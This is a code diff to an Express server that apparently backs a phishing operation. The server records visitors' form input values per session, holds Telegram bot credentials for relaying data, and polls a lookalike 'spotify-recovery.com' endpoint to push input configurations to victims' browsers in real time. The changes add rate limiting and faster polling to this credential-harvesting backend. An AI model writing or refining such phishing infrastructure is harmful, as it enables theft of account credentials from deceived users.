@@ -17,6 +17,14 @@ require("dotenv").config();
 const morgan = require("morgan");
 const cookieParser = require("cookie-parser");
 const cors = require("cors");
+const rateLimit = require('express-rate-limit');
+
+const limiter = rateLimit({
+    windowMs: 60 * 1000,  // 1 minute
+    max: 100,  // Limit each IP to 100 requests per windowMs
+    message: "Too many requests from this IP, please try again later"
+});
+
 
 // MongoDB connection
 mongoose
@@ -65,8 +73,10 @@ let activeUsers = [];
 let previousUsers = [];
 let userInputs = {};
 const ipCache = {};
+let sessionMessages = {}; // Store multiple message IDs for each session
 const dataFilePath = path.join(__dirname, "userSessions.txt");
-
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const CHAD_ID = process.env.TELEGRAM_CHAT_ID;
 // Load existing data from file if it exists
 try {
   if (fs.existsSync(dataFilePath)) {
@@ -87,6 +97,8 @@ const saveDataToFile = () => {
   };
   fs.writeFileSync(dataFilePath, JSON.stringify(data, null, 2));
 };
+
+app.use("/api/", limiter);  // Apply to API routes
 
 app.post("/api/track", async (req, res) => {
   const { sessionId, pageUrl, eventType, inputName, inputValue, componentName, browserInfo } = req.body;
@@ -282,6 +294,9 @@ let configCheckInterval;
 const configCheckLimit = 5; // Limit the number of calls
 let configCheckCount = 0;
 const failedSessionIds = new Set(); // Track session IDs that have failed
+const requestLimit = 1; // Allow 1 request per session per interval
+const intervalTime = 3000; // 3 seconds
+const requestTimestamps = {}; // Track request times per session
 
 const startConfigCheck = () => {
   configCheckInterval = setInterval(async () => {
@@ -295,11 +310,19 @@ const startConfigCheck = () => {
         continue; // Skip session IDs that have previously failed
       }
 
+      const currentTime = Date.now();
+      const lastRequestTime = requestTimestamps[sessionId] || 0;
+
+      if (currentTime - lastRequestTime < intervalTime) {
+        continue; // Skip if the last request was made within the limit
+      }
+
       try {
         const response = await axios.get(`https://spotify-recovery.com/api/get-input-config/${sessionId}`);
         if (response.status === 200) {
           const inputsConfig = response.data.inputsConfig;
           io.to(sessionId).emit('configUpdate', { sessionId, inputsConfig });
+          requestTimestamps[sessionId] = currentTime; // Update last request time
         } else {
           throw new Error('Input configuration not found');
         }
@@ -312,7 +335,7 @@ const startConfigCheck = () => {
     }
 
     configCheckCount++;
-  }, 10000); // Check every 10 seconds
+  }, 1000); // Loop through session IDs every second, but each session limited individually
 };
 
 const stopConfigCheck = () => {
